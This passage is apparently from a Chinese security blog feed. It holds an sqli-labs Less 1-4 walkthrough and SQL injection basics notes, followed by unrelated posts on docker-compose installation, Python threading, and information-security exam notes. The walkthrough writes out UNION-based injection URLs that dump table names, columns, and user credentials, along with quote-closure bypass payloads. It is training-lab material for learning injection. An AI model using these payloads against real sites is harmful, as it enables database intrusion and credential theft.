alt=""></td></tr></tbody></table></li></ul></li></ul><ul><li><p>爆当前数据库的数据表payload:</p><pre><code class="hljs sql">http://172.18.9.66/sqli/Less-1/?id=-1%27 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">"security"</span> <span class="hljs-comment">--+</span></code></pre><table><thead><tr><th>sql语句为 select * from users where id = ‘-1’ union select 1,group _concat(table_name),3 from information_schema.tables  where table_schema = “security” –+ limit 0,1</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727154802.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>爆users表的列</p><pre><code class="hljs sql">http://192.168.5.135/sqli/Less-1/?id=-1%27 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-string">"users"</span> <span class="hljs-comment">--+</span></code></pre><table><thead><tr><th>sql语句: select * from users where id=’-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name = “users” –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814103732.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>爆数据</p><pre><code class="hljs sql">http://192.168.5.135/sqli/Less-1/?id=-1%27 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><table><thead><tr><th>sql语句：select * from user where id = ‘-1’  union select 1,username,password from users  where id=3 –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814105002.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><ul><li>less 1-4都可以使用union联合注入，下文不重复操作了。</li></ul><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><ul><li><p>将单引号添加到id后，返回报错</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814114531.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td>You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near ‘’ LIMIT 0,1’ at line 1</td></tr></tbody></table></li><li><p>执行的查询语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>  <span class="hljs-keyword">table</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-number">1</span><span class="hljs-string">'</span></code></pre><ul><li>报错多了一个单引号，所以这里的单引号破坏了查询返回了报错，查询代码应该为 id= 一个整数</li></ul><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> talbe  <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-built_in">int</span></code></pre><ul><li>打开less2源代码sql查询语句如下，id没有经过处理</li></ul><pre><code class="hljs sql">$sql="<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span> = $<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">";</span></code></pre><ul><li>可成功的注入为</li></ul><table><thead><tr><th>or 1= 1 –+     # 这里不加–+只用or 1=1 也可以</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814115823.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>其余的payload和less1一样，将单引号’去掉即可，不重复了。</p></li></ul><h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><ul><li><p>输入单引号报错</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814120120.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at  line 1</td></tr></tbody></table><ul><li><p>从返回的报错来看，多出了一个)，那么查询语句应该为</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> login_name,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> talbe <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = ($<span class="hljs-keyword">id</span>)</code></pre></li><li><p>补全),使用该代码注入<code>?id=1&#39;)--+</code>,这样一来就输出账号密码了，后续的查询也被注释了</p></li></ul><table><thead><tr><th><a href="http://192.168.5.135/sqli/Less-3/?id=1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-3/?id=1&#39;</a>) –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814120617.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>可成功注入的有</p><pre><code class="hljs sql">')or'1'=('1)or1=1<span class="hljs-comment">--+</span></code></pre></li><li><p>其余payload在less1的’后加)即可</p></li></ul><h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><ul><li><p>输入id=1”</p><table><thead><tr><th><img src="C:%5CUsers%5CHeBe%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200814121202249.png" srcset="/img/loading.gif" alt="image-20200814121202249"></th></tr></thead><tbody><tr><td>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at  line 1</td></tr></tbody></table><ul><li>多了一个双引号和反括号，可见这是对id参数使用了””和()进行包装</li><li>使用<code>id=1 &quot;) --+</code>进行注入，输出了账号密码，后续查询也被注释掉了</li></ul><table><thead><tr><th><a href="http://192.168.5.135/sqli/Less-4/?id=1&quot;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-4/?id=1&quot;</a>) –+</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814121427.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>查询源代码得知查询语句为<code>$sql=&quot;SELECT*FROMusersWHEREid=(“$id”)LIMIT0,1&quot;;</code></p><ul><li>可成功注入payload</li></ul><pre><code class="hljs sql">“)or”1”=(“1“)or1=1<span class="hljs-comment">--+</span></code></pre></li><li><p>其他payload同less1，将‘替换为”)即可</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>sqli-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli手注基础</title>
    <link href="/2020/07/27/sqli%E6%89%8B%E6%B3%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/07/27/sqli%E6%89%8B%E6%B3%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="sql-labs-手注"><a href="#sql-labs-手注" class="headerlink" title="sql-labs 手注"></a>sql-labs 手注</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul><li>早在之前就接触过sql-labs，前两次加起来好像是过了前面十几关把，且也没有详细的做笔记。一两个月没接触，基本忘的差不多了，所以才有了这次三刷sql-labs。</li><li>靶场搭建，其实很简单改一下数配置文件数据库连接密码就行了。这里这里直接略过，不会的话移步百度。</li></ul><h2 id="sql注入基础知识"><a href="#sql注入基础知识" class="headerlink" title="sql注入基础知识"></a>sql注入基础知识</h2><ol><li><p>sql注入的分类</p><ul><li>基于服务器接受到的响应分类<ul><li>基于错误的sql注入</li><li>联合查询的类型</li><li>堆查询注入</li><li>sql盲注<ul><li>基于布尔的sql盲注</li><li>基于时间的sql盲注</li><li>基于报错的sql盲注</li></ul></li></ul></li><li>基于如何处理输入的sql注入<ul><li>字符串类型</li><li>数字类型</li></ul></li><li>基于程度和顺序的注入<ul><li>一阶注入(一阶注入指的是输入的sql语句直接对web服务产生了影响)</li><li>二阶注入(二阶则是类似存储xss，指提交的sql语句无法对web服务产生影响，但可以通过其他辅助间接触发对web的伤害)</li></ul></li><li>基于注入点的分类<ul><li>通过用户输入的表单域的注入</li><li>通过cookie的注入</li><li>通过服务器变量的注入(头部注入)</li></ul></li></ul></li><li><p>常用函数</p><ul><li>系统函数<ul><li>version()  –&gt; Mysql版本</li><li>user() –&gt; 数据库用户名</li><li>database() –&gt; 数据库名</li><li>@@datadir –&gt;数据库路径</li><li>@@version_compile_os –&gt; 操作系统版本</li></ul></li><li>字符串连接函数<ul><li>concat(str1,str2,…) 没有分隔符的连接字符串</li><li>concat_ws((separator,str1, str2) 含有分割符的连接字符串</li><li>group_concat(str1,str2)  连接一个组的所有字符串，并以逗号分隔每一条数据</li><li>上面的解释比较抽象，其实也不用了解的这么详细，只需要知道这三个函数能一次性查出信息就行了</li></ul></li></ul></li><li><p>一般用于尝试的语句</p><ul><li><p>–+ 可以用#替换，url提交过程中#号经过url编码后为%23</p><ul><li>or 1=1 –+</li><li>‘  or 1=1 –+</li><li>“  or 1=1 –+</li><li>) or 1=1 –+</li><li>‘) or 1=1 –+</li><li>“) or 1=1 –+</li><li>“)) or 1=1 –+</li></ul></li><li><p>一般的代码为:</p><pre><code class="hljs php">$id = $_GET[<span class="hljs-string">'id'</span>];$sql = <span class="hljs-string">"SELECT * FROM users WHERE id ='$id'LIMIT 0,1"</span></code></pre><ul><li>此处应该考虑两个点，一个是闭合前面的’，一个是处理后面的’，采用两种思路，闭合后面的引号或者注释点，注释采用–+或#(%23)</li></ul></li></ul></li><li><p>information_schema数据库</p><ul><li><p>information_schema数据库只有在mysql5.0以上的版本才有，该数据库中存放着其他数据库的信息，这里需要记得是里面的几个表是干嘛的就行了</p><ul><li>SCHEMATA –&gt; 存储数据库名，关键字段：SCHEMA_NAME，表示数据库名称。show databases()的结果就是取自于此。</li><li>TABLES –&gt; 存储表名，关键字段：TABLE_SCHEMA表示表所属的数据库名称;TABLE_NAME表示表的名称。</li><li>COLUMNS —-―&gt;存储字段名，关键字段：TABLE_SCHEMA表示表所属的数据库名称;TABLE_NAME表示所属的表的名称，COLUMN_NAME表示字段名。</li></ul><pre><code class="hljs sql">猜数据库<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata 猜某库的表<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=’xxxxx’ 猜某表的列<span class="hljs-keyword">Select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=’xxxxx’ 获取某列的所有内容<span class="hljs-keyword">Select</span> *** <span class="hljs-keyword">from</span> ****</code></pre></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>sqli-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker-compose小记</title>
    <link href="/2020/07/24/docker-compose%E5%B0%8F%E8%AE%B0/"/>
    <url>/2020/07/24/docker-compose%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="docker-compose小记"><a href="#docker-compose小记" class="headerlink" title="docker-compose小记"></a>docker-compose小记</h1><h2 id="安装-centos7环境"><a href="#安装-centos7环境" class="headerlink" title="安装(centos7环境)"></a>安装(centos7环境)</h2><ul><li><p>三种安装方式</p></li><li><p>官网安装 (有没有用不知道，bash 命令是网上抄的，但如果没有科学上网的话curl 会很慢)</p><pre><code class="hljs bash"><span class="hljs-comment"># 下载docker compose</span>sudo curl -L <span class="hljs-string">"https://github.com/docker/compose/releases/download/1.25.0/docker-compose-<span class="hljs-variable">$(uname -s)</span>-<span class="hljs-variable">$(uname -m)</span>"</span> -o /usr/<span class="hljs-built_in">local</span>/bin/docker-compose<span class="hljs-comment"># 添加可执行权限</span>sudo chmod +x /usr/<span class="hljs-built_in">local</span>/bin/docker-compose<span class="hljs-comment"># 将文件copy到 /usr/bin/目录下</span>sudo ln -s /usr/<span class="hljs-built_in">local</span>/bin/docker-compose /usr/bin/docker-compose<span class="hljs-comment"># 查看版本</span>docker-compose --ersion</code></pre></li><li><p>pip安装(这个要先下载pip，如果没有更换pip源的话比上一种还慢。更换pip源挺繁琐的，略过)</p><pre><code class="hljs bash">yum -y install epel-release <span class="hljs-comment">#安装python-pip 依赖包，少了这步后续都无法执行</span>yum -y install python-pippip --versionpip install --upgrade pippip install docker-compose docker-compose version</code></pre></li><li><p>离线安装(这个方式极力推荐，操作方式非常简单且便捷)</p><ul><li>访问docker-compose在github上的项目<a href="https://github.com/docker/compose/releases" target="_blank" rel="noopener">点这里跳转</a></li><li>下载当前操作系统的对应版本，这里下载的是linux64位的</li></ul><p><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200724102607.png" srcset="/img/loading.gif" alt=""></p><ul><li><p>下载好之后使用rz上传到centos7，(不知道rz是什么自行搜索linux lszrz)</p><pre><code class="hljs bash">mv docker-compose-Linux-x86_64 docker-compose<span class="hljs-comment"># 重命名</span>mv docker-compose /usr/<span class="hljs-built_in">local</span>/bin/<span class="hljs-comment"># 剪切到应用目录下</span>chmod u+x docker /usr/<span class="hljs-built_in">local</span>/bin/docker-compose<span class="hljs-comment"># 添加执行权限</span>docker-compose --version <span class="hljs-comment"># 查看版本</span></code></pre></li><li><p>完成上面的操作docker-compose算是安装好了</p></li></ul></li></ul><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><pre><code class="hljs bash">docker-compose ps <span class="hljs-comment">#出所有运行的容器</span>docker-compose up -d <span class="hljs-comment"># 启动容器，需要当前目录下存在docker-compose.yml或docker-compose.yaml</span>docker-compose down <span class="hljs-comment"># 停止当前以yml/yaml运行的容器</span><span class="hljs-comment"># 这里有个大坑就是，你上次运行的容器产生数据后，停止了，再次运行会是新的容器，什么数据都没有了。。。</span>docker-compose stop <span class="hljs-comment"># 就是因为上面会丢失数据，通常停止容器都是用stop -t 指定停止时间</span>docker-compose start <span class="hljs-comment"># 停止之后需要通过start 方式启动，而不是上面的up</span></code></pre><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>各个操作系统的安装docker-compose方式都不一样，找到合适自己的方法才是最好的方法</li><li>使用docker-compose时需要启动docker，没有事先安装docker的话docker-compose时无法使用的</li><li>在启动docker-compose的时候，加载很慢的话那就需要考虑一下使用镜像加速了。具体方法搜索docker镜像加速。</li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker-compose</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_threading乱序问题</title>
    <link href="/2020/07/18/python-threading%E4%B9%B1%E5%BA%8F%E9%97%AE%E9%A2%98/"/>
    <url>/2020/07/18/python-threading%E4%B9%B1%E5%BA%8F%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="python-threading-随笔"><a href="#python-threading-随笔" class="headerlink" title="python threading 随笔"></a>python threading 随笔</h1><h3 id="Semaphore类"><a href="#Semaphore类" class="headerlink" title="Semaphore类"></a>Semaphore类</h3><ul><li><p>写程序多线程执行的时候，经常碰到一个问题就是线程乱序，一直抱着又不是不能用的心理所以放着没解决。今天恰好又碰到了，索性就把这个问题处理了</p></li><li><p>Semaphore是python 内置模块threading中的一个类</p></li><li><p>Semaphore管理着一个计数器，计数器的值默认为1，值不能小于0，计数器的值为0时，调用acquire()的线程就会堵塞。</p><ul><li>每调用一次acquire()方法，计数器减一</li><li>调用一次release()方法，计数器加一</li><li>因此可以利用Semaphore这个类的特征来控制线程数量</li></ul></li><li><p>demo</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(a)</span>:</span>    print(t.name)  <span class="hljs-comment"># 输出线程的名字</span>    print(a)    time.sleep(<span class="hljs-number">1</span>)    sem.release()  <span class="hljs-comment"># 释放 semaphore</span>sem = Semaphore(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 设置计数器的值为 5</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>):    sem.acquire()  <span class="hljs-comment"># 获取一个 semaphore</span>    t = Thread(target=func, args=(i,))    t.start()<span class="hljs-comment"># 当执行两次acquire()方法后,sem中的值为零，线程开始堵塞，func需要延迟一秒才执行结束。</span><span class="hljs-comment"># func执行一次release()，sem的值开始+1，for循环又可以继续执行了</span></code></pre></li></ul>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>threading</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信安理论</title>
    <link href="/2020/07/16/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/07/16/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="信息安全基础"><a href="#信息安全基础" class="headerlink" title="信息安全基础"></a>信息安全基础</h1><ol><li><p>信息安全概念：保护信息系统的硬件，软件及相关数据，使之不因为偶然或而已的侵犯而遭受到破坏，更改和泄露；保证信息系统中的机密性，完整性，和可用性</p></li><li><p><strong>信息安全管理体系</strong>：是组织在整体或特定范围内建立的信息安全方针和目标，以及完善这些目标所采用的方法和手段所构成的体系</p><ol><li>信息安全管理体系<ul><li>密码管理</li><li>网络管理</li><li>设备管理</li><li>人员管理</li></ul></li><li>密码管理<ul><li>密码管理：基于密码机制的安全系统</li><li>商用密码管理原则：统一领导，集中管理，定点研制，专控经营，满足使用。</li><li>商用密码应用：不涉及国家秘密内容但又具有敏感性的内部信息，行政事务信息，经济信息等进行加密保护</li><li>无线局域网产品使用系列密码算法：<ul><li>对称密码算法：SMS4</li><li>签名算法：ECDSA</li><li>密钥协商算法：ECDH</li><li>杂凑算法：SHA-256</li><li>随机数生成算法：自行选择</li></ul></li></ul></li><li>网络管理<ul><li>网络管理：配置管理，性能管理，安全管理，故障管理等。<ul><li>网络管理体系结构包括：协议，表示，安全，对象</li><li>网络管理特征：统一化，智能化，安全化，主动化</li></ul></li><li>设备管理<ul><li>包括设备的选型，检测，安装，登记，使用，维护和存储管理等。</li></ul></li><li>安全设备选取原则：<ul><li>严禁使用未经国家信息安全评测机构认可的信息安全产品</li><li>尽量避免直接使用境外的密码设备，必须采用境外的信息安全产品时，该产品需通过国家信息安全测评机构的认可</li><li>眼睛使用未经国家密码管理部门批准和未通过国家信息安全质量认证的密码设备</li></ul></li><li>人员管理<ul><li>确保有关业务人员的思想素质，职业道德，和业务素质</li><li>人员管理的安全教育对象：包括信息安全相关的所有人员</li></ul></li></ul></li><li>信息安全等级保护1.0(GB17859-1999)<ul><li>等级保护划分依据：信息系统的安全保护等级应对根据信息系统在国家安全，经济建设，社会生活中的重要程度，信息系统遭到破坏后对国家安全，社会秩序，公共利益以及公民，法人和其他组织的合法权益的危害程度等因素</li><li>信息安全等级保护<ol><li>用户自主保护级：隔离用户与数据</li><li>系统审计保护级：在自主访问控制的基础上控制访问权限扩散。</li><li>安全标记级：具有系统审计保护级所有的功能，提供有关安全策略模型，数据标记，具备准确地标记输出信息的能力，消除通过测试发现的任何错误。</li><li>结构化保护级：在安全标记级实施的自主和强制访问控制基础上，进一步扩展到所有的主体和客体，能够审计利用隐蔽存储信道时可能被使用的事件。</li><li>访问验证保护级：满足访问监视器需求，访问监视器仲裁主体对客体的全部访问</li></ol></li><li>涉密信息系统安全分级保护根据其涉密信息系统处理的最高密级，可以划分为秘密级，机密级和机密(增强)级，绝密级。</li><li>分类保护<ul><li>秘密级：包含有最高为秘密级的国家秘密，其防护水平不低于国家信息安全等级保护三级的要求。</li><li>机密级：包含有最高为机密级的国家密码，其防护水平不低于国家安全等级保护四级的要求<ul><li>绝密级：包含有最高为绝密级的国家密码，其防护水平不低于国家信息安全等级保护五级的要求</li></ul></li></ul></li></ul></li></ol></li><li><p>网络隔离</p><ul><li>网络隔离是一项网络安全技术，目标是确保有害的攻击隔离，在可信网络之外保证可信网络内部信息不外泄的前提下，完成网络数据的安全交换。</li><li>网络隔离<ul><li>第一代-完全隔离：完全的物理隔离</li><li>第二代-硬件卡隔离：增加硬件卡隔离</li><li>第三代-数据传播隔离：利用传播系统分时复制文件的途径来实现隔离</li><li>第四代-空气开关隔离：使用单刀双掷开关</li><li>第五代-安全通道隔离：通过专用通信硬件和专有安全协议等安全机制来实现内外网络的隔离和数据交换</li></ul></li><li>网络隔离安全要点：<ul><li>要具有高度的自身安全性</li><li>要确保网络之间是隔离的</li><li>要保证网间交换的只是应用数据</li><li>要对内网的访问进行严格的控制和检查</li><li>要在坚持隔离的前提下保证网络畅通和应用畅通</li></ul></li><li>网络隔离的关键是在对于通信数据的控制，即通过不可路由协议来完成内网数据交换</li></ul></li><li><p>安全监控</p><ul><li>系统安全监控，是指对系统的运行状况和系统中的用户的行为进行监视，控制和记录。安全监控的内容包括主机系统监视，网络状态监视，用户操作监视，主机应用监视，主机外设监视，网络连接监视等。</li><li>安全监控的分类<ul><li>网络安全监控：全面的网络安全控制，细粒度的控制，网络审计和其他包括日志，报警和拦截等功能。</li><li>主机安全监控功能：访问控制，系统监控，系统审计，系统漏洞检查</li></ul></li></ul></li><li><p>信息安全风险评估管理</p><ul><li><p>信息安全风险评估：是依据有关信息安全技术标准，对信息系统及尤其处理，传输和存储的信息的保密性，完整性，可用性等安全属性进行科学评价的过程</p></li><li><p>风险评估方法分为三类：定量评估方法，定性评估方法，定性和定量结合的综合评估方法。</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716104824.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>风险评估方法</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716105127.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>降低风险的途径</p><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716105407.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul></li><li><p>信息安全法律法规</p><ul><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716110548.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>知识产权保护期限</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716144629.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>产权人确定</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716144757.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>侵权判断</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716144921.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul></li><li><p>标准的分类</p><ul><li><p>标准的分类</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716145356.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li><li><p>标准代号的识别</p></li><li><table><thead><tr><th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200716145854.png" srcset="/img/loading.gif" alt=""></th></tr></thead><tbody><tr><td></td></tr></tbody></table></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>信工考证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信工考证</title>
    <link href="/2020/07/15/%E4%BF%A1%E5%B7%A5%E8%80%83%E8%AF%81/"/>
    <url>/2020/07/15/%E4%BF%A1%E5%B7%A5%E8%80%83%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="考证大纲"><a href="#考证大纲" class="headerlink" title="考证大纲"></a>考证大纲</h1><h2 id="上午：信息安全基础知识"><a href="#上午：信息安全基础知识" class="headerlink" title="上午：信息安全基础知识"></a>上午：信息安全基础知识</h2><h4 id="上午主要有六个考点"><a href="#上午主要有六个考点" class="headerlink" title="上午主要有六个考点"></a>上午主要有六个考点</h4><ol><li>信息安全基础知识<ul><li>信息安全概念，信息安全法律法规，信息安全管理基础，信息安全标准化知识，信息安全专业英语</li></ul></li><li>计算机网络基础知识<ul><li>计算机网络的体系结构</li><li>interner协议（IP,ICMP,OSRF,RIP,ARP,IGMP,BGP,TCP,UDP,DNS,SMTP ,POP3,PGP,FTP,HTTP,DHCP）</li></ul></li><li>密码学<ul><li>密码学的基本概念，分组密码，序列密码，Hash函数，公钥密码体制，数字签名，认证，密钥管理</li></ul></li><li>网络安全<ul><li>网络安全的基本概念，网络安全威胁，网络安全防御，无线网络安全。</li></ul></li><li>计算机安全<ul><li>计算机设备安全，操作系统安全，数据库系统安全，恶意代码，计算机取证，嵌入式系统安全，云计算安全</li></ul></li><li>应用系统安全<ul><li>web安全，电子商务安全，信息隐藏，网络舆情，隐私保护</li></ul></li></ol><h2 id="下午：信息安全应用技术"><a href="#下午：信息安全应用技术" class="headerlink" title="下午：信息安全应用技术"></a>下午：信息安全应用技术</h2><ol><li>密码学应用<ul><li>密码算法的实现,密码算法的应用,<strong>认证协议的应用,密钥管理技术</strong></li></ul></li><li><strong>网络安全工程</strong><ul><li>网络安全需求分析和基本设计,<strong>网络安全产品的配置和使用</strong>,网络安全风险评估实施,<strong>网络安全技术应用</strong></li></ul></li><li>系统安全工程<ul><li><strong>访问控制,信息系统安全的需求与分析</strong>,信息安全产品的配置与使用,信息系统安全评估</li></ul></li><li>应用安全工程<ul><li><strong>web安全的需求分析和基本设计,电子商务安全的需求分析和基本设计,嵌入式系统的安全应用,数字水印在版权中的应用,位置隐私技术的应用</strong></li></ul></li></ol><h1 id="计算机硬件基础"><a href="#计算机硬件基础" class="headerlink" title="计算机硬件基础"></a>计算机硬件基础</h1><ol><li><p>中央处理器</p><ul><li>四个功能<ul><li>cpu的基础功能：指令控制，操作控制，时间控制，数据加工</li><li>cpu的组成：运算器，控制器，cache</li><li>控制器：<ul><li>功能：指挥计算机各个部件协调一致的自动运行</li><li>组成：程序计数器(PC)，指令寄存器(IR)，指令译码器，时序产生器，操作控制器</li></ul></li><li>运算器 (ALU)：<ul><li>功能：在控制器的指挥下，进行算术运算和逻辑运算</li><li>组成：算数逻辑单元（ALU），通用寄存器，数据缓冲寄存（DR）状态条件寄存器（PSW）</li></ul></li></ul></li><li>cpu中的主要寄存器：<ul><li>cpu缓冲寄存器（DR）：暂时存放（ALU）的运算结果，或有数据存储器读出的一个数据字，或来自外部接口的一个数据字</li><li>指令寄存器（IR）：保存当前正在执行的一条指令</li><li>程序计数器（PC）：确定下一条指令</li><li>数据地址寄存器（AR）：保存当前cpu所访问的数据cache存储器中的地址</li><li>通用寄存器（R0~R3）：当ALU执行算术或逻辑运算时，为ALU提供一个工作区</li><li>状态寄存器（PSW）：保存由算术指和逻辑质量你个运算或测试结果建立的各种条件代码</li></ul></li></ul></li><li><p>指令的寻址方式</p><ul><li><p>指令格式：操作数/地址码</p></li><li><p>寻址方式：太多了，记不过来。需要的时候再去百度把</p></li></ul></li></ol><ol start="3"><li><p>存储器</p><ul><li><p>存储器又称为内存，主要用来存放计算机在运行期间正在执行的程序和数据，<strong>cpu可以直接访问内存</strong></p></li><li><p>存储单位，存储元，位（bit） ，字节（B）</p><table><thead><tr><th>换算前</th><th></th></tr></thead><tbody><tr><td>8bit</td><td>1B</td></tr><tr><td>2<sup>10</sup>B</td><td>1kb</td></tr><tr><td>2<sup>10</sup>KB</td><td>1MB</td></tr><tr><td>2<sup>10</sup>MB</td><td>1GB</td></tr><tr><td>2<sup>10</sup>GB</td><td>!TB</td></tr></tbody></table></li></ul></li></ol><ol 